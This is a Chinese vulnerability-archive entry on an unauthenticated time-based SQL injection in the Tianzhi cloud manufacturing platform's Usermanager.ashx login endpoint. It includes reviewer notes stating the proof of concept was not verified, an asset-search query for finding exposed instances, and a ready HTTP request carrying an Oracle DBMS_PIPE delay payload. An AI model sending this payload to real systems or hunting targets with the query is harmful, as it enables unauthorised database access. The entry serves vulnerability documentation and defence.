---
source: "wy876 漏洞文库"
title: "天智云制造管理平台 Usermanager LOGIN username SQL注入"
product: "天智云制造管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Oracle DBMS_PIPE调用权限/可用性；产品版本未知"
prerequisites: "登录前请求示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/suc76y4muoeqbtkp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A4%A9%E6%99%BA%E6%99%BA%E8%83%BD/%E5%A4%A9%E6%99%BA%E4%BA%91%E5%88%B6%E9%80%A0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-34ba7524d94391cd43ee90a7"
entity_id: "ve-34ba7524d94391cd43ee90a7"
schema_version: "1"
---

# 天智云制造管理平台 Usermanager LOGIN username SQL注入

## 条目说明

- 对象与具体问题：天智云制造管理平台；Usermanager LOGIN username SQL注入
- 版本、配置及部署条件：Oracle DBMS_PIPE调用权限/可用性；产品版本未知
- 认证与权限前提：登录前请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 不能见ASP.NET就当SQL Server，本载荷明确Oracle DBMS_PIPE；需数据库/权限条件
- 有基准与5秒请求无计时结果，等待结果值1566不必为真仍可延时，需说明判断逻辑
- SaaS与私有部署版本不同须界定；HTTP错标Rust，产品介绍重复
- 补修复和源码

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
天智(苏州)智能系统有限公司天智云制造管理平台是一款专注于中小企业智能化生产管理的SaaS软件。该平台通过一站式服务串联销售、采购、生产、质量和仓库等部门，实现生产全过程的数字化管理。它具备生产管理、订单管理、质量追溯、仓库管理等多项功能，并通过移动化、可配置的方式，满足企业个性化需求。天智云制造管理平台致力于提高生产效率、降低生产成本、提升产品质量，帮助中小企业实现数智化转型。天智云制造管理平台是一款专注于中小企业智能化生产管理的SaaS软件。该系统 Usermanager.ashx 存在sql注入漏洞，攻击者可获取数据库敏感信息。

## 二、影响版本
+ 天智云制造管理平台


## 三、资产测绘
```plain
body="Ashx/Usermanager.ashx"
```

## 四、漏洞复现
```http
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

type=LOGIN&username=1') AND 1566=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(90)||CHR(98)||CHR(107),5) AND ('DgMy'='DgMy&pwd=123&vendor=
```


```http
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

type=LOGIN&username=1&pwd=123&vendor=
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/suc76y4muoeqbtkp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
